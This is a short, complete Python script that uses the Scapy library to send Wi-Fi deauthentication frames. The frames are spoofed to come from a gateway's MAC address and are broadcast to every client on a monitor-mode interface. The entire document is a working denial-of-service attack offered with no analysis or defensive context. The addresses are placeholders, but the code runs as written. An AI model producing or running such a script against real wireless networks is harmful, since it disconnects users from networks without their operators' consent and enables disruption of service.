from scapy.all import *

def deauth_attack(target_mac, gateway_mac, iface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    sendp(packet, iface=iface, count=100, inter=.1)

target_mac = "FF:FF:FF:FF:FF:FF"
gateway_mac = "00:11:22:33:44:55"
iface = "wlan0mon"
deauth_attack(target_mac, gateway_mac, iface)
